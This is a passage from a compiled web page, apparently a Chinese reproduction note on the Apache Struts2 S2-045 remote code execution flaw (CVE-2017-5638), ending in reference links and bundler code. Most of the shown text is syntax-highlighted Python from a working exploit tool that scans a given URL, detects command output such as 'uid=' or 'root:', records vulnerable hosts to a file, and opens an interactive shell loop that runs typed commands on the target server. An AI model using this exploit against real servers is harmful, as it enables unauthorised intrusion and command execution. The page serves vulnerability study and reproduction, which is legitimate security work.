                <span class="token keyword">if</span> result<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">&quot;ASCII&quot;</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">or</span> result<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">&quot;No such&quot;</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">or</span> result<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">&quot;Directory of&quot;</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">or</span> result<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">&quot;Volume Serial&quot;</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">or</span> result<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">&quot;inet&quot;</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">or</span> result<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">&quot;root:&quot;</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">or</span> result<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">&quot;uid=&quot;</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">or</span> result<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">&quot;accounts&quot;</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">or</span> result<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">&quot;Cuentas&quot;</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>
                    <span class="token keyword">print</span><span class="token punctuation">(</span>RED<span class="token operator">+</span><span class="token string">&quot;   [-] VULNERABLE&quot;</span><span class="token operator">+</span>ENDC<span class="token punctuation">)</span>
                    owned <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">&#39;vulnsite.txt&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;a&#39;</span><span class="token punctuation">)</span>
                    owned<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>host<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">&#39;\\n&#39;</span><span class="token punctuation">)</span>
                    owned<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>

                    opcion <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span>YELLOW<span class="token operator">+</span><span class="token string">&quot;   [-] RUN THIS EXPLOIT (s/n): &quot;</span><span class="token operator">+</span>ENDC<span class="token punctuation">)</span>
                    <span class="token keyword">if</span> opcion <span class="token operator">==</span> <span class="token string">&#39;s&#39;</span><span class="token punctuation">:</span>
                        <span class="token keyword">print</span><span class="token punctuation">(</span>YELLOW<span class="token operator">+</span><span class="token string">&quot;   [-] GET PROMPT...\\n&quot;</span><span class="token operator">+</span>ENDC<span class="token punctuation">)</span>
                        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
                        <span class="token keyword">print</span><span class="token punctuation">(</span>BOLD<span class="token operator">+</span><span class="token string">&quot;   * [UPLOAD SHELL]&quot;</span><span class="token operator">+</span>ENDC<span class="token punctuation">)</span>
                        <span class="token keyword">print</span><span class="token punctuation">(</span>OTRO<span class="token operator">+</span><span class="token string">&quot;     Struts@Shell:$ pwnd (php)\\n&quot;</span><span class="token operator">+</span>ENDC<span class="token punctuation">)</span>

                        <span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>
                            separador <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span>GREEN<span class="token operator">+</span><span class="token string">&quot;Struts2@Shell_3:$ &quot;</span><span class="token operator">+</span>ENDC<span class="token punctuation">)</span>
                            espacio <span class="token operator">=</span> separador<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">&#39; &#39;</span><span class="token punctuation">)</span>
                            comando <span class="token operator">=</span> <span class="token string">&quot;%20&quot;</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>espacio<span class="token punctuation">)</span>

                            shell <span class="token operator">=</span> urllib<span class="token punctuation">.</span>request<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span>host<span class="token operator">+</span>exploit3<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>comando<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
                            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;\\n&quot;</span><span class="token operator">+</span>shell<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

                    <span class="token keyword">else</span><span class="token punctuation">:</span>
                        x <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>validador<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
                        exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
                <span class="token keyword">else</span><span class="token punctuation">:</span>
                    <span class="token keyword">print</span><span class="token punctuation">(</span>BLUE<span class="token operator">+</span><span class="token string">&quot;     [-] NO VULNERABLE &quot;</span><span class="token operator">+</span>ENDC <span class="token operator">+</span> <span class="token string">&quot;Payload: &quot;</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token keyword">except</span><span class="token punctuation">:</span>
                <span class="token keyword">pass</span>
            x<span class="token operator">=</span>x<span class="token operator">+</span><span class="token number">1</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>RED<span class="token operator">+</span><span class="token string">&quot; Debe introducir el protocolo (https o http) para el dominio\\n&quot;</span><span class="token operator">+</span>ENDC<span class="token punctuation">)</span>
        exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
<span class="token keyword">else</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>RED<span class="token operator">+</span><span class="token string">&quot; Debe Ingresar una Url\\n&quot;</span><span class="token operator">+</span>ENDC<span class="token punctuation">)</span>
    exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,3);function q(w,h){const a=o("ExternalLinkIcon");return c(),l("div",null,[u,r,k,n("ul",null,[n("li",null,[n("a",d,[s("http://struts.apache.org/docs/s2-045.html"),t(a)])]),n("li",null,[n("a",v,[s("https://blog.csdn.net/u011721501/article/details/60768657"),t(a)])]),n("li",null,[n("a",m,[s("https://paper.seebug.org/247/"),t(a)])])]),b,n("p",null,[s("参考"),n("a",g,[s("struts-pwn"),t(a)])]),y])}const E=e(i,[["render",q],["__file","Struts2 S2-045 远程代码执行漏洞 CVE-2017-5638.html.vue"]]);export{E as default};
